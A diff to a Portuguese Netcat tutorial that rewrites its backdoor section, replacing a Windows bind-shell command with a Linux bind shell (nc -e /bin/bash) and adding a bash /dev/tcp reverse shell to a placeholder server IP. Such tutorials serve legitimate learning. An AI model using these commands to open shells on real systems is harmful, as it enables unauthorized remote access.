@@ -101,8 +101,18 @@ Você também pode executar o Netcat como um backdoor. No entanto, isso exige ma
 
 Para atuar como backdoor, você precisa do Netcat para ouvir em uma porta escolhida (por exemplo, porta 3001) no servidor de destino e, em seguida, você pode conectar-se a essa porta a partir da sua máquina da seguinte maneira.
 
-Este é o comando que deve ser executado no servidor remoto em que o -d opção desativa a leitura de stdin e -e especifica o comando para executar no sistema de destino.
+Este é o comando que deve ser executado no servidor remoto em que o -e especifica o comando para executar no sistema de destino.
+    Servidor
+    $ nc -lvp 3001 -e /bin/bash
 
-$ nc -L -p 3001 -d -e cmd.exe 
+    Cliente
+    $ nc <IP-SERVIDOR> 3001
+
+outra forma
+    Servidor que vai ganhar Shell
+    $ nc -lvp 3001
+
+    Cliente que vai passar o Shell
+    $ bash -i >& /dev/tcp/<IP_SERVIDOR>/3001 0>&1
 
 Por último, mas não menos importante, o Netcat pode ser usado como proxy para diferentes serviços / protocolos, incluindo HTTP, SSH e muitos mais. Para mais informações, consulte sua página de manual.
